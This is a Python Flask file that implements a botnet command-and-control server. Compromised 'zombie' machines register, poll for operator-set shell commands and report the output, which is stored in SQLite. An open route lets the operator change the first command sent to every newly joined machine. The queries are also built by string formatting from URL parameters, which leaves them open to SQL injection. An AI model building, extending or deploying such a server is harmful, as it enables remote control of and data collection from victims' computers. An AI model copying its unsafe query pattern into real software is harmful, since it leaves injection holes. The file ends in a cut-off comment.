from flask import Flask
import sqlite3

app = Flask(__name__)

# command = "a return request"
database_name = "test2.db"
newcomer_command = "dir" # a dir command for windows cmd

@app.route("/getId")
def give_id():
    """give an id for a newcomer zombie"""
    global database_name
    conn = sqlite3.connect(database_name)
    cur = conn.execute("select id from zombies order by id desc limit(1)")
    res = cur.fetchall()
    # cur.fetchall returns a list of tuples (that's what a table is)
    last_id = 0 if len(res)==0 else int(res[0][0])
    return str(last_id+1)

@app.route("/reportResult/<zid>/<command>/<response>")
def main(zid, command, response):
    """this is how i receive responses (from zombies) to previously sent commands."""
    global database_name
    conn = sqlite3.connect(database_name)
    conn.execute("insert into z{} values ('{}','{}');".format(zid, command, response))
    conn.commit()
    return "recorded"


@app.route("/setNewcomerCommand/<the_command>")
def set_newcomer_command(the_command):
    """this method is reserved for me. it's how i change the newcomer_command."""
    global newcomer_command
    newcomer_command = the_command
    return f"Now the newcomer_command is {newcomer_command}"


@app.route("/getCommand/<zid>")
def send_command(zid):
    """this method will be hit by a zombie repeatedly within some time interval."""
    print("send command running")
    global database_name
    global newcomer_command
    # fetch the next command for the zombie with that zid
    conn = sqlite3.connect(database_name)
    cur = conn.execute("select id from zombies where id='{}'".format(zid))
    result = cur.fetchall()
    # check if the zombie is known or not.
    if len(result)==0: # new zombie. give it the newcommer command
        # add the zombie (and a die command) to the zombies table and create another table just for the zombie.
        # the die command here means that all zombies die after the newcomer_command. I'll see their result
        # for the newcomer_command and revive them if they're interesting.
        sql = "insert into zombies (id, command) values ('{}', '{}')".format(zid, "die")
        conn.execute(sql)
        sql = "create table z{} (command, response)".format(zid)
        conn.execute(sql)
        conn.commit()
        conn.close()
        print("a new zombie joined with zid : {}".format(zid))
        return newcomer_command
    elif len(result)==1:
        # return the command I've put in the database for the zombie
        # the command to be sent is stored in the zombies table next to the id of the zombie.
        # the zombie is known so get the command I've put for it.
        cur = conn.execute("select command from zombies where id='{}'".format(zid))
        res = cur.fetchall()
        # if this assertion fails, there's is (some how) more than one zombie with the same id. That's not good.
        assert(len(res)) == 1
        command = res[0][0]
        # Fetch the command i put for the zombie in the zombies table and give it.
        conn.close()
        print("the command is", command)
        print("the type of res is", type(res))
        print("the type of the command is", type(command))
        return command
    else:
        conn.commit()
        conn.close()
        print("something is wrong in the send_command method.")
        raise Exception()


# to do: I discovvered the uuid is different everytime the script starts. fix this it should be constatnt on the same 